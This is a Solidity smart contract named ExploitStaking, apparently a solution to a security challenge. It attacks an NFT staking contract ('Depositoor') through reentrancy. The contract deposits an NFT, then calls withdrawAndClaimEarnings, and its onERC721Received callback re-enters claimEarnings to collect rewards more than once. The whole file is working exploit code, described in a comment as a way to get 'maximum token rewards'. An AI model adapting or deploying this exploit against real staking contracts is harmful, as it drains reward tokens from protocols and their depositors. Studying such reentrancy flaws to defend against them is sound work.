// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "./RewardToken.sol";

// This contract is used to exploit the NFT staking system for maximum token rewards
contract ExploitStaking is IERC721Receiver {
    IERC721 private nftToStake; // NFT to be staked
    IERC20 private rewardTokenContract; // Reward token contract
    Depositoor private stakingContract; // NFT staking contract
    uint256 private tokenId = 99; // NFT Token ID to be used

    constructor() {}

    function triggerExploit(
        address _nftToStake,
        address _stakingContract,
        address _rewardTokenContract
    ) external {
        stakingContract = Depositoor(_stakingContract);
        nftToStake = IERC721(_nftToStake);
        rewardTokenContract = IERC20(_rewardTokenContract);

        stakingContract.withdrawAndClaimEarnings(tokenId);
    }

    // Transfers NFT to the staking contract
    function depositNFT(
        address _nftToStake,
        address _stakingContract,
        address _rewardTokenContract
    ) external {
        // Initialize contract addresses for interaction
        stakingContract = Depositoor(_stakingContract);
        nftToStake = IERC721(_nftToStake);
        rewardTokenContract = IERC20(_rewardTokenContract);

        nftToStake.approve(address(stakingContract), tokenId);

        nftToStake.safeTransferFrom(
            address(this),
            address(stakingContract),
            tokenId
        );
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        stakingContract.claimEarnings(tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
